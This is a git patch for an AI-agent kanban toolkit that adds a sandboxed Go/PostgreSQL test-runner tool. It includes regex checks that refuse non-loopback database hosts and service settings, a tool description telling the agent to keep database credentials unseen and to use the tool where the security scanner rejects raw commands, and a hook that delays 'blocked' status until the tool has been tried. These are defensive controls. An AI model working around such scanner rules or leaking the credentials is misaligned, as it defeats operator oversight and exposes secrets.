++        for qm in re.finditer(r"(?i)[?&](host|hostaddr|service)=([^&#]*)", m.group(2)):
++            if qm.group(1).lower() == "service":
++                return _SERVICE_REFUSAL
++            bad = _non_loopback(qm.group(2))
++            if bad is not None:
++                return _host_refusal(bad)
++    for m in _PG_CLIENT_RE.finditer(command):
++        args = m.group(1)
++        for hm in re.finditer(r"(?:^|\s)(?:-h\s*|--host[=\s]+)(['\"]?)([^\s'\"]+)\1|\b(?:host|hostaddr)=([^\s'\"]+)",
++                              args):
++            bad = _non_loopback(hm.group(2) or hm.group(3) or "")
++            if bad is not None:
++                return _host_refusal(bad)
++        if re.search(r"(?:^|[\s'\"])service=", args):
++            return _SERVICE_REFUSAL
++    for m in re.finditer(_ENV_PREFIX + r"(?:PGHOST|PGHOSTADDR)=(['\"]?)([^\s'\"]+)\1", command):
++        bad = _non_loopback(m.group(2))
++        if bad is not None:
++            return _host_refusal(bad)
++    if re.search(_ENV_PREFIX + r"PGSERVICE(?:FILE)?=", command):
++        return _SERVICE_REFUSAL
++    return None
++
++
++# ----------------------------------------------------------------- schema ---
++
++DEV_TEST_RUN_SCHEMA = {
++    "name": TOOL_NAME,
++    "description": (
++        "Run the operator-registered Go/PostgreSQL development tests of this card's checkout in a trusted "
++        "sandbox (go test -json -count=1 -p=1, -race by default, optional go vet). Use it instead of a terminal "
++        "`PGPASSFILE=... *_DATABASE_URL=... go test` command, which the security scanner rejects in unattended "
++        "runs. The database URL and credential file come from the registered profile; never pass, read or print "
++        "them. Needs this run's repository lease (workflow.py preflight). Returns exit_code, tests "
++        "{passed, failed, skipped}, skipped_tests with reasons, failed_tests with output, packages and vet."
++    ),
++    "parameters": {
++        "type": "object",
++        "properties": {
++            "profile": {"type": "string", "description": "Registered profile name, e.g. validate-matching."},
++            "packages": {"type": "array", "items": {"type": "string"},
++                         "description": "Package patterns inside the profile's approved set: ./... (default) or "
++                                        "./internal/db, ./internal/..."},
++            "run": {"type": "string", "description": "Optional go test -run regex (no spaces or quotes)."},
++            "race": {"type": "boolean", "description": "Race detector (default true)."},
++            "short": {"type": "boolean", "description": "go test -short (default false)."},
++            "vet": {"type": "boolean", "description": "Also run go vet on the same packages (default false)."},
++            "timeout_seconds": {"type": "integer", "minimum": TIMEOUT_MIN, "maximum": TIMEOUT_MAX,
++                                "description": "go test -timeout (default 1200)."},
++        },
++        "required": ["profile"],
++        "additionalProperties": False,
++    },
++}
++
++registry.register(
++    name=TOOL_NAME,
++    toolset="kanban",
++    schema=DEV_TEST_RUN_SCHEMA,
++    handler=lambda args, **kw: dev_test_run(args),
++    check_fn=_check_fn,
++    emoji="🧪",
++)
+diff --git a/tools/kanban_tools.py b/tools/kanban_tools.py
+index f616a4d53a..19f4617f9b 100644
+--- a/tools/kanban_tools.py
++++ b/tools/kanban_tools.py
+@@ -615,10 +615,23 @@ def _handle_complete(args: dict, **kw) -> str:
+         return _ok(task_id=tid, run_id=run.id if run else None)
+ 
+ 
++def _check_scanner_recovery() -> None:
++    """A command the scanner rejected while a registered approved equivalent exists is not a
++    blocker until that equivalent was tried (tools.dev_test_tool recovery state)."""
++    try:
++        from tools.dev_test_tool import block_refusal
++        message = block_refusal()
++    except Exception:
++        message = None
++    if message:
++        raise _Reject(message)
++
++
+ @_kanban_handler("kanban_block")
+ def _handle_block(args: dict, **kw) -> str:
+     """Transition the task to blocked with a reason a human will read."""
+     tid = _worker_guard("kanban_block", args)
++    _check_scanner_recovery()
+     reason = _redact(
+         _require_text(args, "reason", "reason is required — explain what input you need"))
+     kind = args.get("kind")
+-- 
+2.43.0
+
